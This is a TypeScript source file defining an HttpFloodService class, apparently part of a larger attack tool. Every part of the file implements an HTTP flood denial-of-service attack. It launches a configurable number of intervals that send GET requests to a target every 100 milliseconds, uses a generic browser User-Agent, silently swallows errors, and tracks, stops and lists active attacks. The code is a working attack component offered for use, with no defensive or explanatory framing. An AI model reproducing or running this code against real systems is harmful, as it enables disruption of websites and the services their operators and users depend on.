import { AttackConfig } from '../../types';
import { logger } from '../../utils/logger';

export class HttpFloodService {
  private activeAttacks: Map<string, NodeJS.Timeout[]> = new Map();

  async start(config: AttackConfig): Promise<void> {
    const { target, duration, threads } = config;
    const attackId = `${target}-${Date.now()}`;
    const timeouts: NodeJS.Timeout[] = [];

    logger.info(`Starting HTTP flood attack on ${target} with ${threads} threads for ${duration}s`);

    const startTime = Date.now();
    const endTime = startTime + duration * 1000;

    for (let i = 0; i < threads; i++) {
      const interval = setInterval(async () => {
        if (Date.now() >= endTime) {
          clearInterval(interval);
          return;
        }

        try {
          await fetch(target, {
            method: 'GET',
            headers: {
              'User-Agent': 'Mozilla/5.0',
            },
          });
        } catch (error) {
        }
      }, 100);

      timeouts.push(interval);
    }

    this.activeAttacks.set(attackId, timeouts);

    setTimeout(() => {
      this.stop(attackId);
    }, duration * 1000);
  }

  stop(attackId: string): void {
    const timeouts = this.activeAttacks.get(attackId);
    if (timeouts) {
      timeouts.forEach(clearInterval);
      this.activeAttacks.delete(attackId);
      logger.info(`Stopped attack: ${attackId}`);
    }
  }

  stopAll(): void {
    this.activeAttacks.forEach((timeouts) => {
      timeouts.forEach(clearInterval);
    });
    this.activeAttacks.clear();
    logger.info('All attacks stopped');
  }

  getActiveAttacks(): string[] {
    return Array.from(this.activeAttacks.keys());
  }
}

export const httpFloodService = new HttpFloodService();

